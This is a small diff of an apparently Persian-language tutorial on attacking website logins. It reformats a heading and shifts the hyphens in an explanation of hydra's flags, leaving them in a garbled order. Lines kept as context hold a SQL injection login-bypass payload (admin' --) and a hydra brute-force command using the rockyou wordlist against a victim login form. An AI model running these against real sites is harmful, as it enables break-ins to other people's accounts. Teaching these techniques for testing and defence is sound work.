@@ -1,4 +1,4 @@
-1. login with website
+# 1. login with website
 
 ```
 admin' --
@@ -77,8 +77,8 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt victim-ip http-post-form "/lo
 
 <p dir="rtl" align="justify">
   <ul dir="rtl">
-    <li>-l admin: نام کاربری هدف.</li>
-	<li>-P rockyou.txt: لیست پسوردهای معروف.</li>
+    <li>l admin-: نام کاربری هدف.</li>
+	<li>P rockyou.txt-: لیست پسوردهای معروف.</li>
 	<li>http-post-form: نوع حمله (POST).</li>
 	<li>F=login_failed.html: شرط تشخیص شکست (اگر این صفحه نمایش داده شد، پسورد اشتباه است).</li>
   </ul>
